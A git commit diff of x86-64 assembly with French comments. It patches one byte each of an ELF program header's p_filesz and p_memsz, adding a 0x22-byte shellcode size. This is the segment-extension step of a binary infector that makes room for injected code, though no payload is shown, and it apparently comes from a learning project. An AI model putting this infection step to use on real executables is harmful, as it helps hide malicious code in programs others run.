60b1751bdaa628b67e62492cf5081bc20f78f11b
RolexSir30 <141523629+RolexSir30@users.noreply.github.com>
2024-12-14 20:31:28 +0100

    ici j'ajoute aussi 0x22(taille shellcod à p_memsz;

--- octetmodif.asm
+++ octetmodif.asm
@@ -3,10 +3,12 @@ section .data
     position dq 488
     buffer db 0
     tailleShellcode dw 0x22
+    position_memsz dq 496  ; Position pour p_memsz
 
 section .bss
     file_descriptor resq 1
     p_filesz resb 1
+    p_memsz resb 1  ; Réserve de l'espace pour p_memsz
 
 section .text
 global _start
@@ -25,26 +27,26 @@ _start:
     cmp rax, 0
     jl error
 
-    ; Positionner le curseur pour lire
+    ; Positionner le curseur pour lire p_filesz
     mov rax, 8
     mov rdi, [file_descriptor]
     mov rsi, [position]
     xor rdx, rdx  ; SEEK_SET
     syscall
 
-    ; Lire l'octet
+    ; Lire l'octet pour p_filesz
     mov rax, 0
     mov rdi, [file_descriptor]
     mov rsi, buffer
     mov rdx, 1
     syscall
 
-    ; Additionner buffer et tailleShellcode
+    ; Additionner buffer et tailleShellcode pour p_filesz
     movzx ax, byte [buffer]
     add ax, [tailleShellcode]
-    mov [p_filesz], al
+    mov [p_filesz], al  ; p_filesz contient la valeur de p_filesz + la taille du shellcode
 
-    ; Repositionner le curseur pour écrire
+    ; Repositionner le curseur pour écrire p_filesz
     mov rax, 8
     mov rdi, [file_descriptor]
     mov rsi, [position]
@@ -55,6 +57,39 @@ _start:
     mov rax, 1
     mov rdi, [file_descriptor]
     lea rsi, [p_filesz]
+    mov rdx, 1
+    syscall
+
+    ; Positionner le curseur pour lire p_memsz
+    mov rax, 8
+    mov rdi, [file_descriptor]
+    mov rsi, [position_memsz]
+    xor rdx, rdx  ; SEEK_SET
+    syscall
+
+    ; Lire l'octet pour p_memsz
+    mov rax, 0
+    mov rdi, [file_descriptor]
+    mov rsi, buffer
+    mov rdx, 1
+    syscall
+
+    ; Additionner buffer et tailleShellcode pour p_memsz
+    movzx ax, byte [buffer]
+    add ax, [tailleShellcode]
+    mov [p_memsz], al  ; p_memsz contient la valeur de p_memsz + la taille du shellcode
+
+    ; Repositionner le curseur pour écrire p_memsz
+    mov rax, 8
+    mov rdi, [file_descriptor]
+    mov rsi, [position_memsz]
+    xor rdx, rdx  ; SEEK_SET
+    syscall
+
+    ; Écrire le contenu de p_memsz
+    mov rax, 1
+    mov rdi, [file_descriptor]
+    lea rsi, [p_memsz]
     mov rdx, 1
     syscall
 
